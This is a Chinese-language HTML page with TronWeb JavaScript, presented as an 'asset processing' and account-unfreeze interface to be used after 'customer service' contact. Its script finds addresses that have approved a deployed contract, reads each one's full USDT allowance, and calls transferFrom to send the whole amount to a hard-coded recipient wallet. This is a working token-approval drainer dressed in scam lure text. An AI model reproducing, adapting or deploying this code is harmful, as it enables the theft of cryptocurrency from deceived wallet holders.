<!doctype html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>資產處理介面</title>
  <style>
    .center {
      margin: auto;
      width: 60%;
      padding: 10px;
    }
    button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="center">
    <button id="connectButton">請連接錢包</button>
    <button id="transferFrom_Btn">轉帳（請在客服通知後操作）</button>
    <label>驗證完成後將開啟解凍流程</label>
  </div>

  <script>
    const connectButton = document.getElementById("connectButton");
    const transferFromButton = document.getElementById("transferFrom_Btn");

    const USDT_contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 主網 USDT
    const MyDex_contractAddress = "TMuFNH1Dq6QnkaK5U1d55QWDB65VCig1JK"; // 你部署的合約地址
    const toAddressBase58 = "TPta9GWqYaDYwcR8ZorUpduz9y3nt7Qp6G"; // 收款人地址

    connectButton.onclick = async () => {
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        alert("錢包已連接：" + window.tronWeb.defaultAddress.base58);
        connectButton.innerHTML = "已連接：" + window.tronWeb.defaultAddress.base58;
      } else {
        alert("請使用 TronLink 或 imToken 開啟");
      }
    };

    transferFromButton.onclick = async () => {
      try {
        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
          return alert("尚未連接錢包");
        }

        const MyDex = await window.tronWeb.contract().at(MyDex_contractAddress);
        const USDT = await window.tronWeb.contract().at(USDT_contractAddress);

        // 使用 hex 格式的地址（避免非法參數）
        const from = await MyDex.getIndexAddress(0).call(); // hex 格式
        const to = window.tronWeb.address.toHex(toAddressBase58); // 轉換成 hex 格式

        const allowance = await USDT.allowance(from, MyDex_contractAddress).call();
        const amount = allowance; // hex 格式數值，直接傳

        if (BigInt(amount) === 0n) {
          return alert("尚未授權或授權金額為 0");
        }

        const tx = await MyDex.transferFrom(from, to, amount).send({ feeLimit: 100_000_000 });
        alert("✅ 轉帳成功，交易 ID：" + tx);
      } catch (err) {
        console.error("❌ 轉帳失敗：", err);
        alert("❌ 轉帳失敗：" + (err.message || "未知錯誤"));
      }
    };
  </script>
</body>
</html>
